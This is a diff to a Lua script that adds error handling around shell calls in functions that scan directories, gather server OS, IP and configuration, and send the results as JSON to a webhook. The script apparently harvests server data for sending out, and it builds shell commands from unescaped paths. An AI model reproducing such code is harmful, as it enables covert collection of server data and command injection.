@@ -378,6 +378,10 @@ function Utils.get_server_os()
     else
         -- Fallback method via io.popen
         local handle = io.popen("uname -s 2>/dev/null || echo unknown")
+        if not handle then
+            return "Unknown"
+        end
+        
         local result = Utils.trim(handle:read("*a") or "")
         handle:close()
         
@@ -550,7 +554,14 @@ function FileScanner.find_files(directory, pattern, max_depth, current_depth)
     end
     
     local results = {}
+    
+    -- This is the fix for the nil handle error
     local handle = io.popen('dir "' .. directory .. '" /b /a 2>nul || ls -la "' .. directory .. '" 2>/dev/null')
+    if not handle then
+        Logger.error("Failed to open directory: " .. directory)
+        return {}
+    end
+    
     local result = handle:read("*a")
     handle:close()
     
@@ -560,6 +571,13 @@ function FileScanner.find_files(directory, pattern, max_depth, current_depth)
         -- Check if it's a directory
         local is_dir = false
         local dir_check = io.popen('if exist "' .. full_path .. '\\*" echo DIR || echo FILE')
+        
+        -- Add error handling for the dir_check
+        if not dir_check then
+            Logger.error("Failed to check if path is directory: " .. full_path)
+            goto continue -- Skip this iteration
+        end
+        
         local dir_result = dir_check:read("*l")
         dir_check:close()
         
@@ -577,6 +595,8 @@ function FileScanner.find_files(directory, pattern, max_depth, current_depth)
         elseif file:match(pattern) then
             table.insert(results, full_path)
         end
+        
+        ::continue::
     end
     
     return results
@@ -1353,7 +1373,6 @@ function DataCollector.collect_server_config()
     
     return config_vars
 end
-
 -- Main data collection function
 function DataCollector.collect_all_data(callback)
     Utils.get_server_ip(function(server_ip, error)
@@ -1918,7 +1937,7 @@ local function collect_and_send_data()
                     inline = false
                 })
             end
-        }
+        end
         
         -- Send to webhook
         local json_data = json.encode(webhook_data)
